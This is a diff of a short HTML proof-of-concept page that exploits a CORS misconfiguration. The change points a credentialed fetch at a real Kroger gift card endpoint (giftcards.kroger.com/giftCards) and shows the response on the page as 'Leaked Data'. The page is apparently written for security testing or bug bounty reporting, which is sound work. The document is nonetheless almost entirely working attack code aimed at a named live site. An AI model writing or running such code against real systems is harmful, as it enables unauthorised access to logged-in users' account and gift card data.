@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CORS PoC</title>
+    <title>CORS PoC - giftcards.kroger.com</title>
   </head>
   <body>
-    <h2>CORS Exploit Test: /ui/dashboard</h2>
-    <p>Trying to fetch sensitive data...</p>
-    <pre id="output">Waiting...</pre>
+    <h2>CORS Exploit Test: giftcards.kroger.com</h2>
+    <p>Fetching sensitive data from Kroger gift cards subdomain...</p>
+    <pre id="output">Waiting for response...</pre>
 
     <script>
-      fetch("https://api.kroger.com/ui/dashboard", {
+      fetch("https://giftcards.kroger.com/giftCards", {
         method: "GET",
         credentials: "include"
       })
-      .then(response => response.text())
+      .then(res => res.text())
       .then(data => {
         document.getElementById("output").innerText = "Leaked Data:\n" + data;
       })
